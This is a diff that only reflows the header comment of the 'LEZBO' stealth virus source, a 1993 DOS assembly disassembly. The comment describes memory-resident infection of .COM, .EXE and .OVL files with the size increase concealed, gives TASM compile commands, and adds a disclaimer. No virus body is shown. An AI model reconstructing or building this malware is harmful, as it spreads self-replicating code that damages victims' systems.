@@ -1,36 +1,38 @@
-COMMENT ~===============================================================
-=
-=                             LEZBO Virus                                    =
-                             -----------                                    = 
-        Disassembly (c)1993 Karsten Johansson, PC Scavenger               =
-=
-=========================================================================
-=  CAUTION:  This program is a highly virulent stealth virus. Once in        =
-            memory, it is virtually invisible.                              =
-=
-=  NOTES:    This is a demonstration virus only, and will only execute 
-=            on the 386+ computer.  This was done to avoid widespread 
-=            misuse.
-=
-=            The virus installs itself at the base memory ceiling. When      =
-            in memory, infected files will not show a size increase. 
-=            The virus is 666 bytes long, but uses 3K of memory when 
-=            installed.
-=
-=            DO NOT INFECT ANYONE'S SYSTEM BUT YOUR OWN!  To do so is a      =
-            federal offence.                                                =
-=
-=  COMPILE:  With TASM:           TASM     LEZBO                             =
-                                 TLINK /3 LEZBO                             =
-=  INSTALL:  Execute LEZBO.EXE on a 386 or above only.  All .COM, .EXE 
-=            and .OVL files will be infected if they are opened for any 
-=            reason.  Execution on an 8086 or 286 computer will result 
-=            in a crash.
-=
-=========================================================================
-=  BEFORE COMPILING THIS CODE, IT MUST BE NOTED THAT THE AUTHOR AND          =  PUBLISHER OF THIS BOOK CANNOT BE HELD LIABLE FOR ANY DAMAGES THAT MAY     =  BE INCURRED BY THE USE OF OR THE EXPERIMENTATION WITH COMPUTER            =  VIRUSES. THIS BOOK IS FOR EDUCATIONAL PURPOSES ONLY. EDUCATION IS NOT     =  HERE TO BE ABUSED.                                                        =
-=
-=======================================================================~
+COMMENT ~=================================================================
+=                             LEZBO Virus                                =
+=                            -----------                                 = 
+=                                                                        =
+=       Disassembly (c)1993 Karsten Johansson, PC Scavenger              =
+==========================================================================
+=  CAUTION:  This program is a highly virulent stealth virus. Once in    =
+=            memory, it is virtually invisible.                          =
+=                                                                        =
+=  NOTES:    This is a demonstration virus only, and will only execute   =
+=            on the 386+ computer.  This was done to avoid widespread    =
+=            misuse.                                                     =
+=                                                                        =
+=            The virus installs itself at the base memory ceiling. When  =
+=            in memory, infected files will not show a size increase.    =
+=            The virus is 666 bytes long, but uses 3K of memory when     =
+=            installed.                                                  =
+=                                                                        =
+=            DO NOT INFECT ANYONE'S SYSTEM BUT YOUR OWN!  To do so is a  =
+=            federal offence.                                            =
+=                                                                        =
+=  COMPILE:  With TASM:           TASM     LEZBO                         =
+=                                 TLINK /3 LEZBO                         =
+=  INSTALL:  Execute LEZBO.EXE on a 386 or above only.  All .COM, .EXE   = 
+=            and .OVL files will be infected if they are opened for any  =
+=            reason.  Execution on an 8086 or 286 computer will result   =
+=            in a crash.                                                 =
+=                                                                        =
+==========================================================================
+=  BEFORE COMPILING THIS CODE, IT MUST BE NOTED THAT THE AUTHOR AND      =
+=  PUBLISHER OF THIS BOOK CANNOT BE HELD LIABLE FOR ANY DAMAGES THAT MAY =  
+=  BE INCURRED BY THE USE OF OR THE EXPERIMENTATION WITH COMPUTER        =  
+=  VIRUSES. THIS BOOK IS FOR EDUCATIONAL PURPOSES ONLY. EDUCATION IS NOT =  
+=  HERE TO BE ABUSED.                                                    =
+=========================================================================~
 
         .model   tiny
          P386N                               ;386 non-protected mode
